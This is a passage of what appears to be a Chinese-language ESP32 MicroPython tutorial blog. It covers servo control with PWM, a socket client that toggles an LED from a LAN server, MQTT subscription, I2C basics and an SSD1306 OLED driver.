（PWM）</h2><p><img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/1707373183032-94426b38-fd15-4275-b4b5-0ce4192f25f1.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> Pin,PWM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0度 PWM对象.duty_u16(1638)</span></span><br><span class="line"><span class="comment"># 90度 PWM对象.duty_u16(4915)</span></span><br><span class="line"><span class="comment"># 180度 PWM对象.duty_u16(8192)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> machine <span class="keyword">import</span> Pin, PWM</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">p2 = PWM(Pin(<span class="number">2</span>))</span><br><span class="line">p2.freq(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0度   p2.duty_u16(1638)</span></span><br><span class="line"><span class="comment"># 90度  p2.duty_u16(4915)</span></span><br><span class="line"><span class="comment"># 180度 p2.duty_u16(8192)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    p2.duty_u16(<span class="number">1638</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p2.duty_u16(<span class="number">4915</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p2.duty_u16(<span class="number">8192</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1638</span>, <span class="number">8192</span>, <span class="number">10</span>):</span><br><span class="line">    p2.duty_u16(i)</span><br><span class="line">    time.sleep_ms(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h2 id="network模块-socket模块-网络"><a href="#network模块-socket模块-网络" class="headerlink" title="network模块 socket模块 | 网络"></a>network模块 socket模块 | 网络</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> machine</span><br><span class="line"><span class="keyword">import</span> network</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">APP</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.check_wlan()</span><br><span class="line">        self.connect_control()</span><br><span class="line">        self.switch = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_wlan</span>(<span class="params">self</span>):</span><br><span class="line">        wlan = network.WLAN(network.STA_IF)</span><br><span class="line">        wlan.active(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> wlan.isconnected():</span><br><span class="line">            wlan.connect(<span class="string">&#x27;1003-2.4G&#x27;</span>, <span class="string">&#x27;********&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(wlan.isconnected(), wlan.isconnected(), wlan.ifconfig())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">led</span>(<span class="params">self</span>):</span><br><span class="line">        pin2 = machine.Pin(<span class="number">2</span>, machine.Pin.OUT)</span><br><span class="line">        <span class="keyword">if</span> self.switch:</span><br><span class="line">            pin2.value(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pin2.value(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">connect_control</span>(<span class="params">self</span>):</span><br><span class="line">        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        conn.connect((<span class="string">&#x27;192.168.2.178&#x27;</span>, <span class="number">12345</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.switch = <span class="built_in">int</span>(conn.recv(<span class="number">1024</span>).decode().strip())</span><br><span class="line">            self.led()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">APP()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import network</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wlan = network.WLAN(network.STA_IF) # 创建一个接口对象 STA_IF station_ifconfig 终端模式</span></span><br><span class="line"><span class="string">wlan.active(True)       # 激活接口</span></span><br><span class="line"><span class="string">wlan.scan()             # 扫描热点</span></span><br><span class="line"><span class="string">wlan.isconnected()      # 判断该设备是否连接 WIFI</span></span><br><span class="line"><span class="string">wlan.connect(&#x27;ssid&#x27;, &#x27;key&#x27;) # 连接一个 WIFI 默认连接后永久连接</span></span><br><span class="line"><span class="string">wlan.config(&#x27;mac&#x27;)      # 返回接口的 MAC 地址</span></span><br><span class="line"><span class="string">wlan.ifconfig()         # 返回接口的 IP 掩码 网关 DNS地址</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ap = network.WLAN(network.AP_IF) # create access-point interface AP_IF AP_config 热点模式</span></span><br><span class="line"><span class="string">ap.config(ssid=&#x27;ESP-AP&#x27;) # set the SSID of the access point</span></span><br><span class="line"><span class="string">ap.config(max_clients=10) # set how many clients can connect to the network</span></span><br><span class="line"><span class="string">ap.active(True)         # activate the interface</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import socket</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 服务端</span></span><br><span class="line"><span class="string">socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span></span><br><span class="line"><span class="string">socket.bind((&#x27;127.0.0.1&#x27;,5555))</span></span><br><span class="line"><span class="string">socket.listen(3) # 最大待连接数为3</span></span><br><span class="line"><span class="string">a,b = socket.accept() # a 为连接信息 b 为客户端ip和端口号</span></span><br><span class="line"><span class="string">a.recv(1024) # 1024 为接收数据的量</span></span><br><span class="line"><span class="string">a.send(&#x27;test&#x27;.encode())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 客户端</span></span><br><span class="line"><span class="string">socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span></span><br><span class="line"><span class="string">socket.connect((&#x27;127.0.0.1&#x27;,5555))</span></span><br><span class="line"><span class="string">socket.recv(1024)</span></span><br><span class="line"><span class="string">a.send(&#x27;test&#x27;.encode())</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># socket两参数说明</span></span><br><span class="line"><span class="string">socket.AF_INET 表示的是IPv4（这也是socket里默认的）</span></span><br><span class="line"><span class="string">socket.AF_INET6 表示的是IPv6</span></span><br><span class="line"><span class="string">socket.AF_UNIX 这个主要用于单一的UNIX进程间的通信</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">socket.SOCK_STREAM //流式socketTCP协议（默认的），用来保证数据顺序以及可靠性</span></span><br><span class="line"><span class="string">socket.SOCK_DGRAM //这是报式socket UDP协议，保证数据接受的顺序，不可靠的连接</span></span><br><span class="line"><span class="string">socket.SOCK_RAW //这是原始套接字，允许对底层协议（TCP/IP）直接访问</span></span><br></pre></td></tr></table></figure><h2 id="Bluetooth模块"><a href="#Bluetooth模块" class="headerlink" title="# Bluetooth模块"></a># Bluetooth模块</h2><h2 id="MQTT通信模块"><a href="#MQTT通信模块" class="headerlink" title="MQTT通信模块"></a>MQTT通信模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> umqtt.simple <span class="keyword">import</span> MQTTClient</span><br><span class="line"><span class="comment"># MQTTClient(client_id, server, port=0, user=None, password=None, keepalive=0, ssl=False, ssl_params=&#123;&#125;)</span></span><br><span class="line"><span class="comment"># topic msg 为字节型</span></span><br><span class="line"><span class="comment"># MQTTClient.set_callback(f) f(topic, msg) 为回调函数,第1参数为 topic 接收到的主题,第2参数为 msg 为该主题消息</span></span><br><span class="line"><span class="comment"># MQTTClient.set_last_will(topic, msg, retain=False, qos=0) topic 和 msg 为字节类型 设置MQTT“last will”消息。应该在 connect()之前调用。</span></span><br><span class="line"><span class="comment"># MQTTClient.connect(clean_session=True) 连接到服务器。如果此连接使用存储在服务器上的持久会话，则返回True（如果使用clean_session = True参数，则返回False（默认值））</span></span><br><span class="line"><span class="comment"># MQTTClient.disconnect() 释放资源</span></span><br><span class="line"><span class="comment"># MQTTClient.ping() ping服务器</span></span><br><span class="line"><span class="comment"># MQTTClient.publish(topic, msg, retain=False, qos=0) 发布消息</span></span><br><span class="line"><span class="comment"># MQTTClient.subscribe(topic, qos=0) 订阅主题</span></span><br><span class="line"><span class="comment"># MQTTClient.wait_msg() 等待服务器消息。订阅消息将通过set_callback（）传递给回调集，任何其他消息都将在内部处理。</span></span><br><span class="line"><span class="comment"># MQTTClient.check_msg() 检查服务器是否有待处理的消息。如果是，则以与wait_msg（）相同的方式处理，如果不是，则立即返回。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_cb</span>(<span class="params">topic, msg</span>): <span class="comment"># 回调函数，收到服务器消息后会调用这个函数，topic为接收到的主题，msg为接收到的消息</span></span><br><span class="line">    <span class="built_in">print</span>(topic, msg) <span class="comment"># 标题，内容</span></span><br><span class="line"></span><br><span class="line">conn = MQTTClient(<span class="string">&quot;local_windows&quot;</span>,<span class="string">&quot;192.168.2.178&quot;</span>,port) <span class="comment"># MQTT连接 ID，服务器</span></span><br><span class="line">conn.set_callback(sub_cb) <span class="comment"># 设置回执函数 </span></span><br><span class="line">conn.connect()</span><br><span class="line">conn.subscribe(<span class="string">b&quot;test&quot;</span>) <span class="comment"># 监控ledctl这个通道，接收控制命令 # 订阅主题</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn.check_msg()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="ssd1306模块-oled-图像（I2C学习）"><a href="#ssd1306模块-oled-图像（I2C学习）" class="headerlink" title="ssd1306模块 | oled 图像（I2C学习）"></a>ssd1306模块 | oled 图像（I2C学习）</h2><p>I2C协议：集成电路总线，只通过两根线控制总线，而且可以多设备链接<br>I2C原理：<br>1.SDA从高电频到低电频，之后SCL从高电频到低电频率，向从机发动启动条件<br><img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/1706890130006-bdc66d54-f36f-4f7d-99d3-ee05586a9397.png" alt="image.png"><br>2.发送从设备地址<br><img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/1706890155259-6b929b51-438e-42c3-843d-6270a9aca7ed.png" alt="image.png"><br>3.接收应答，如果地址匹配，SDA拉低一个表示返回一个ACK（0），如果不匹配拉高返回一个NACK（1）<br><img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/1706890182757-2db70a55-60fb-478a-91d2-ff2459b2a3d6.png" alt="image.png"><br>4.收发数据<br><img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/1706890201257-4bff5a94-f14e-4141-834c-1d0c5ad98a64.png" alt="image.png"><img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/1706890269094-f7e6801c-1972-4089-9d00-d7fb8ec9c70c.png" alt="image.png"><br>5.接收应答，返回一个ACK（0），表示接收到信号<img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/1706890269094-f7e6801c-1972-4089-9d00-d7fb8ec9c70c-170782109028811.png" alt="image.png"><br>6.停止通信，SCL和SDA切换高电频，停止接收信号<img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/1706890280390-f4761028-c5e6-496d-a982-9d1c8f3deeea.png" alt="image.png"><br>总结<br><img src="/ESP32-%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/1706890022309-f96d383d-a9a4-4cf0-b16b-1f2b9014f283.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MicroPython SSD1306 OLED driver, I2C and SPI interfaces created by Adafruit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> framebuf</span><br><span class="line"></span><br><span class="line"><span class="comment"># register definitions</span></span><br><span class="line">SET_CONTRAST        = const(<span class="number">0x81</span>)</span><br><span class="line">SET_ENTIRE_ON       = const(<span class="number">0xa4</span>)</span><br><span class="line">SET_NORM_INV        = const(<span class="number">0xa6</span>)</span><br><span class="line">SET_DISP            = const(<span class="number">0xae</span>)</span><br><span class="line">SET_MEM_ADDR        = const(<span class="number">0x20</span>)</span><br><span class="line">SET_COL_ADDR        = const(<span class="number">0x21</span>)</span><br><span class="line">SET_PAGE_ADDR       = const(<span class="number">0x22</span>)</span><br><span class="line">SET_DISP_START_LINE = const(<span class="number">0x40</span>)</span><br><span class="line">SET_SEG_REMAP       = const(<span class="number">0xa0</span>)</span><br><span class="line">SET_MUX_RATIO       = const(<span class="number">0xa8</span>)</span><br><span class="line">SET_COM_OUT_DIR     = const(<span class="number">0xc0</span>)</span><br><span class="line">SET_DISP_OFFSET     = const(<span class="number">0xd3</span>)</span><br><span class="line">SET_COM_PIN_CFG     = const(<span class="number">0xda</span>)</span><br><span class="line">SET_DISP_CLK_DIV    = const(<span class="number">0xd5</span>)</span><br><span class="line">SET_PRECHARGE       = const(<span class="number">0xd9</span>)</span><br><span class="line">SET_VCOM_DESEL      = const(<span class="number">0xdb</span>)</span><br><span class="line">SET_CHARGE_PUMP     = const(<span class="number">0x8d</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SSD1306</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, width, height, external_vcc</span>):</span><br><span class="line">        self.width = width</span><br><span class="line">        self.height = height</span><br><span class="line">        self.external_vcc = external_vcc</span><br><span class="line">        self.pages = self.height // <span class="number">8</span></span><br><span class="line">        <span class="comment"># Note the subclass must initialize self.framebuf to a framebuffer.</span></span><br><span class="line">        <span class="comment"># This is necessary because the underlying data buffer is different</span></span><br><span class="line">        <span class="comment"># between I2C and SPI implementations (I2C needs an extra byte).</span></span><br><span class="line">        self.poweron()</span><br><span class="line">        self.init_display()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init_display</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> cmd <span class="keyword">in</span> (</span><br><span class="line">            SET_DISP | <span class="number">0x00</span>, <span class="comment"># off</span></span><br><span class="line">            <span class="comment"># address setting</span></span><br><span class="line">            SET_MEM_ADDR, <span class="number">0x00</span>, <span class="comment"># horizontal</span></span><br><span class="line">            <span class="comment"># resolution and layout</span></span><br><span class="line">            SET_DISP_START_LINE | <span class="number">0x00</span>,</span><br><span class="line">            SET_SEG_REMAP | <span class="number">0x01</span>, <span class="comment"># column addr 127 mapped to SEG0</span></span><br><span class="line">            SET_MUX_RATIO, self.height - <span class="number">1</span>,</span><br><span class="line">            SET_COM_OUT_DIR | <span class="number">0x08</span>, <span class="comment"># scan from COM[N] to COM0</span></span><br><span class="line">            SET_DISP_OFFSET, <span class="number">0x00</span>,</span><br><span class="line">            SET_COM_PIN_CFG, <span class="number">0x02</span> <span class="keyword">if</span> self.height == <span class="number">32</span> <span class="keyword">else</span> <span class="number">0x12</span>,</span><br><span class="line">            <span class="comment"># timing and driving scheme</span></span><br><span class="line">            SET_DISP_CLK_DIV, <span class="number">0x80</span>,</span><br><span class="line">            SET_PRECHARGE, <span class="number">0x22</span> <span class="keyword">if</span> self.external_vcc <span class="keyword">else</span> <span class="number">0xf1</span>,</span><br><span class="line">            SET_VCOM_DESEL, <span class="number">0x30</span>, <span class="comment"># 0.83*Vcc</span></span><br><span class="line">            <span class="comment"># display</span></span><br><span class="line">            SET_CONTRAST, <span class="number">0xff</span>, <span class="comment"># maximum</span></span><br><span class="line">            SET_ENTIRE_ON, <span class="comment"># output follows RAM contents</span></span><br><span class="line">            SET_NORM_INV, <span class="comment"># not inverted</span></span><br><span class="line">            <span class="comment"># charge pump</span></span><br><span class="line">            SET_CHARGE_PUMP, <span class="number">0x10</span> <span class="keyword">if</span> self.external_vcc <span class="keyword">else</span> <span class="number">0x14</span>,</span><br><span class="line">            SET_DISP | <span class="number">0x01</span>): <span class="comment"># on</span></span><br><span class="line">            self.write_cmd(cmd)</span><br><span class="line">        self.fill(<span class="number">0</span>)</span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">poweroff</span>(<span class="params">self</span>):</span><br><span class="line">        self.write_cmd(SET_DISP | <span class="number">0x00</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">contrast</span>(<span class="params">self, contrast</span>):</span><br><span class="line">        self.write_cmd(SET_CONTRAST)</span><br><span class="line">        self.write_cmd(contrast)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invert</span>(<span class="params">self, invert</span>):</span><br><span class="line">        self.write_cmd(SET_NORM_INV | (invert &amp; <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        x0 = <span class="number">0</span></span><br><span class="line">        x1 = self.width - <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.width == <span class="number">64</span>:</span><br><span class="line">            <span class="comment"># displays with width of 64 pixels are shifted by 32</span></span><br><span class="line">            x0 += <span class="number">32</span></span><br><span class="line">            x1 += <span class="number">32</span></span><br><span class="line">        self.write_cmd(SET_COL_ADDR)</span><br><span class="line">        self.write_cmd(x0)</span><br><span class="line">        self.write_cmd(x1)</span><br><span class="line">        self.write_cmd(SET_PAGE_ADDR)</span><br><span class="line">        self.write_cmd(<span class="number">0</span>)</span><br><span class="line">        self.write_cmd(self.pages - <span class="number">1</span>)</span><br><span class="line">        self.write_framebuf()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">self, col</span>):</span><br><span class="line">        self.framebuf.fill(col)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pixel</span>(<span class="params">self, x, y, col</span>):</span><br><span class="line">        self.framebuf.pixel(x, y, col)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scroll</span>(<span class="params">self, dx, dy</span>):</span><br><span class="line">        self.framebuf.scroll(dx, dy)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">text</span>(<span class="params">self, string, x, y, col=<span class="number">1</span></span>):</span><br><span class="line">        self.framebuf.text(string, x, y, col)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SSD1306_I2C</span>(<span class="title class_ inherited__">SSD1306</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, width, height, i2c, addr=<span class="number">0x3c</span>, external_vcc=<span class="literal">False</span></span>):</span><br><span class="line">        self.i2c = i2c</span><br><span class="line">        self.addr = addr</span><br><span class="line">        self.temp = <span class="built_in">bytearray</span>(<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># Add an extra byte to the data buffer to hold an I2C data/command byte</span></span><br><span class="line">        <span class="comment"># to use hardware-compatible I2C transactions.  A memoryview of the</span></span><br><span class="line">        <span class="comment"># buffer is used to mask this byte from the framebuffer operations</span></span><br><span class="line">        <span class="comment"># (without a major memory hit as memoryview doesn&#x27;t copy to a separate</span></span><br><span class="line">        <span class="comment"># buffer).</span></span><br><span class="line">        self.buffer = <span class="built_in">bytearray</span>(((height // <span class="number">8</span>) * width) + <span class="number">1</span>)</span><br><span class="line">        self.buffer[<span class="number">0</span>] = <span class="number">0x40</span>  <span class="comment"># Set first byte of data buffer to Co=0, D/C=1</span></span><br><span class="line">        self.framebuf = framebuf.FrameBuffer1(<span class="built_in">memoryview</span>(self.buffer)[<span class="number">1</span>:], width, height)</span><br><span class="line">        <span class="built_in">super</span>().__init__(width, height, external_vcc)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_cmd</span>(<span class="params">self, cmd</span>):</span><br><span class="line">        self.temp[<span class="number">0</span>] = <span class="number">0x80</span> <span class="comment"># Co=1, D/C#=0</span></span><br><span class="line">        self.temp[<span class="number">1</span>] = cmd</span><br><span class="line">        self.i2c.writeto(self.addr, self.temp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_framebuf</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># Blast out the frame buffer using a single I2C transaction to support</span></span><br><span class="line">        <span class="comment"># hardware I2C interfaces.</span></span><br><span class="line">        self.i2c.writeto(self.addr, self.buffer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">poweron</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SSD1306_SPI</span>(<span class="title class_ inherited__">SSD1306</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, width, height, spi, dc, res, cs, external_vcc=<span class="literal">False</span></span>):</span><br><span class="line">        self.rate = <span class="number">10</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">        dc.init(dc.OUT, value=<span class="number">0</span>)</span><br><span class="line">        res.init(res.OUT, value=<span class="number">0</span>)</span><br><span class="line">        cs.init(cs.OUT, value=<span class="number">1</span>)</span><br><span class="line">        self.spi = spi</span><br><span class="line">        self.dc = dc</span><br><span class="line">        self.res = res</span><br><span class="line">        self.cs = cs</span><br><span class="line">        self.buffer = <span class="built_in">bytearray</span>((height // <span class="number">8</span>) * width)</span><br><span class="line">        self.framebuf = framebuf.FrameBuffer1(self.buffer, width, height)</span><br><span class="line">        <span class="built_in">super</span>().__init__(width, height, external_vcc)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_cmd</span>(<span class="params">self, cmd</span>):</span><br><span class="line">        self.spi.init(baudrate=self.rate, polarity=<span class="number">0</span>, phase=<span class="number">0</span>)</span><br><span class="line">        self.cs.high()</span><br><span class="line">        self.dc.low()</span><br><span class="line">        self.cs.low()</span><br><span class="line">        self.spi.write(<span class="built_in">bytearray</span>([cmd]))</span><br><span class="line">        self.cs.high()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_framebuf</span>(<span class="params">self</span>):</span><br><span class="line">        self.spi.init(baudrate=self.rate, polarity=<span class="number">0</span>, phase=<span class="number">0</span>)</span><br><span class="line">        self.cs.high()</span><br><span class="line">        self.dc.high()</span><br><span class="line">        